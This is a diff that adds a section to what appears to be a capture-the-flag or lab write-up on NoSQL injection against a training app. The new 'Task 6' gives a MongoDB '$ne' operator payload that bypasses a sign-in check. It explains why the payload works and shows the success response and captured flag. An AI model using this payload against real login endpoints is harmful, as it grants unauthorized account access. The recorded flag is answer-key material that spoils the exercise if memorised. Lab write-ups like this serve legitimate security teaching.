@@ -84,3 +84,20 @@ proving the coin field is interpreted as a raw MongoDB query operator
 rather than a sanitized string filter. This is NOT harmful since it only
 exposes public market data (no auth bypass, no sensitive data exposure) -
 unlike the sign_in endpoint which allows full authentication bypass.
+
+## Task 6 - NoSQL Login Bypass
+
+**Endpoint:** /api/a3/nosql_injection/sign_in (POST)
+
+**Payload:**
+{"username":{"$ne":null},"password":{"$ne":null}}
+
+**Why it works:** The $ne (not equal) MongoDB operator matches any document
+where the field is not equal to null - which is true for every user record.
+This bypasses the intended username/password equality check entirely,
+logging in as the first matching user without valid credentials.
+
+**Result:**
+{"status":"success","message":"Congratulations For your Sign in!\nFLAG: 56c48f5ae9ab0ffaaafb2a28d4999341"}
+
+**Flag:** 56c48f5ae9ab0ffaaafb2a28d4999341
